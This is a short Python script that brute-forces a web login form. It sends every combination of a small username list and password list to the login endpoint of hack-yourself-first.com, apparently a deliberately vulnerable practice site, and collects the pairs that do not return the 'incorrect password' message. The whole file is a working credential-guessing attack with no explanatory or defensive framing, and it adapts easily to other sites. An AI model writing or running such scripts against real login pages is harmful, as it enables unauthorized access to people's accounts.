import requests

hits = []
emails = ['admin', '123123', 'admin@gmail.com', 'root', 'pan']
passw1 = ['admin', '123123', 'admin@gmail.com', 'root', 'pan2']

for i in emails:
    for a in passw1:
        data_payload = {
            "Email": i,
            "Password": a,
            "RememberMe": "false"}
        site = requests.post("https://hack-yourself-first.com/Account/Login", data=data_payload)
        print(site.status_code)
        print(i + ':' + a)
        combo_hits = i + ':' + a
        if "The email or password provided is incorrect." not in site.text:
            print("Logged in")
            hits.append(combo_hits)
        else:
            print("Login failed")
print(hits)



